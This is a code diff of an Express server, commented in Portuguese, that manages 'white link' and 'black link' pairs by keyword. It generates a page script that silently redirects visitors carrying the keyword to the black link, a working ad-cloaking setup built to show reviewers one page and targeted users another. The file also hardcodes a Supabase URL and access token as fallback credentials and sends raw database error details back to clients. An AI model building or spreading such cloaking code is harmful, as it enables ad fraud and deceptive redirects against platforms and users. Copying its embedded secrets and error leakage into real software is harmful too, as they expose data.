@@ -15,6 +15,9 @@ const supabaseUrl = process.env.SUPABASE_URL || 'https://lzukjzmvcjugmfomajzx.su
 const supabaseKey = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6dWtqem12Y2p1Z21mb21hanp4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3Nzg1MzEsImV4cCI6MjA3MTM1NDUzMX0.TDsLMdiIIR3XjRUtlG_ylJo8LGN3feQoAtipdh1Imgg';
 const supabase = createClient(supabaseUrl, supabaseKey);
 
+// Debug: confirmar conexão
+console.log("✅ Supabase client inicializado:", supabaseUrl);
+
 // Generate UTM parameters
 function generateUTM(campaignType, keyword) {
   const baseParams = `utm_source=${campaignType.toUpperCase()}&keyword=${keyword}`;
@@ -34,7 +37,7 @@ function generateScript(keyword) {
 (function(){
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.has('keyword')) {
-    fetch('https://backend-jknh.onrender.com/api/check?keyword=' + urlParams.get('keyword'))
+    fetch('/api/check?keyword=' + urlParams.get('keyword'))
       .then(response => response.json())
       .then(data => {
         if (data.redirect && data.url) {
@@ -53,22 +56,29 @@ function generateScript(keyword) {
 
 // Create new configuration
 app.post('/api/configs', async (req, res) => {
+  console.log("📩 [POST /api/configs] Payload recebido:", req.body);
   try {
     const { keyword, whiteLink, blackLink, campaignType } = req.body;
     
     // Validate required fields
     if (!keyword || !whiteLink || !blackLink || !campaignType) {
+      console.warn("⚠️ Campos obrigatórios faltando:", req.body);
       return res.status(400).json({ error: 'Missing required fields' });
     }
     
     // Check if keyword already exists
-    const { data: existing } = await supabase
+    const { data: existing, error: existingError } = await supabase
       .from('link_configs')
       .select('*')
       .eq('keyword', keyword)
-      .single();
-    
+      .maybeSingle();
+
+    if (existingError) {
+      console.error("❌ Erro ao buscar keyword:", existingError);
+    }
+
     if (existing) {
+      console.warn("⚠️ Keyword já existe:", keyword);
       return res.status(400).json({ error: 'Keyword already exists' });
     }
     
@@ -86,15 +96,16 @@ app.post('/api/configs', async (req, res) => {
       .single();
     
     if (error) {
-      console.error('Supabase error:', error);
-      return res.status(500).json({ error: 'Database error' });
+      console.error('❌ Erro ao inserir no Supabase:', error);
+      return res.status(500).json({ error: 'Database error', details: error.message });
     }
     
+    console.log("✅ Config criada:", data);
+
     // Generate UTM and script
     const utm = generateUTM(campaignType, keyword);
     const script = generateScript(keyword);
-    fetch('https://backend-jknh.onrender.com/api/check?keyword=' + urlParams.get('keyword'))
-
+    const apiUrl = `${process.env.BASE_URL || `http://localhost:${PORT}`}/api/check?keyword=${keyword}`;
     
     res.json({
       config: {
@@ -110,13 +121,14 @@ app.post('/api/configs', async (req, res) => {
       apiUrl
     });
   } catch (error) {
-    console.error('Server error:', error);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('❌ Erro no servidor [POST /api/configs]:', error);
+    res.status(500).json({ error: 'Internal server error', details: error.message });
   }
 });
 
 // Get all configurations
 app.get('/api/configs', async (req, res) => {
+  console.log("📩 [GET /api/configs]");
   try {
     const { data, error } = await supabase
       .from('link_configs')
@@ -124,28 +136,21 @@ app.get('/api/configs', async (req, res) => {
       .order('created_at', { ascending: false });
     
     if (error) {
-      console.error('Supabase error:', error);
-      return res.status(500).json({ error: 'Database error' });
+      console.error('❌ Erro ao buscar configs:', error);
+      return res.status(500).json({ error: 'Database error', details: error.message });
     }
     
-    const configs = data.map(item => ({
-      id: item.id,
-      keyword: item.keyword,
-      whiteLink: item.white_link,
-      blackLink: item.black_link,
-      campaignType: item.campaign_type,
-      createdAt: item.created_at
-    }));
-    
-    res.json(configs);
+    console.log("✅ Configs retornadas:", data.length);
+    res.json(data);
   } catch (error) {
-    console.error('Server error:', error);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('❌ Erro no servidor [GET /api/configs]:', error);
+    res.status(500).json({ error: 'Internal server error', details: error.message });
   }
 });
 
 // Delete configuration
 app.delete('/api/configs/:id', async (req, res) => {
+  console.log("📩 [DELETE /api/configs/:id]", req.params);
   try {
     const { id } = req.params;
     
@@ -155,19 +160,21 @@ app.delete('/api/configs/:id', async (req, res) => {
       .eq('id', id);
     
     if (error) {
-      console.error('Supabase error:', error);
-      return res.status(500).json({ error: 'Database error' });
+      console.error('❌ Erro ao deletar config:', error);
+      return res.status(500).json({ error: 'Database error', details: error.message });
     }
     
+    console.log("✅ Config deletada:", id);
     res.json({ success: true });
   } catch (error) {
-    console.error('Server error:', error);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('❌ Erro no servidor [DELETE /api/configs/:id]:', error);
+    res.status(500).json({ error: 'Internal server error', details: error.message });
   }
 });
 
-// Check keyword and redirect (This is the main API endpoint)
+// Check keyword and redirect
 app.get('/api/check', async (req, res) => {
+  console.log("📩 [GET /api/check]", req.query);
   try {
     const { keyword } = req.query;
     
@@ -175,26 +182,31 @@ app.get('/api/check', async (req, res) => {
       return res.json({ redirect: false, message: 'No keyword provided' });
     }
     
-    // Find configuration for this keyword
     const { data, error } = await supabase
       .from('link_configs')
       .select('*')
       .eq('keyword', keyword)
-      .single();
+      .maybeSingle();
     
-    if (error || !data) {
+    if (error) {
+      console.error("❌ Erro ao buscar keyword:", error);
+      return res.json({ redirect: false, message: 'Database error', details: error.message });
+    }
+
+    if (!data) {
+      console.warn("⚠️ Keyword não encontrada:", keyword);
       return res.json({ redirect: false, message: 'Keyword not found' });
     }
     
-    // Return black link for redirect
+    console.log("✅ Keyword encontrada:", data);
     res.json({
       redirect: true,
       url: data.black_link,
       message: 'Keyword verified'
     });
   } catch (error) {
-    console.error('Server error:', error);
-    res.json({ redirect: false, message: 'Server error' });
+    console.error('❌ Erro no servidor [GET /api/check]:', error);
+    res.json({ redirect: false, message: 'Server error', details: error.message });
   }
 });
 
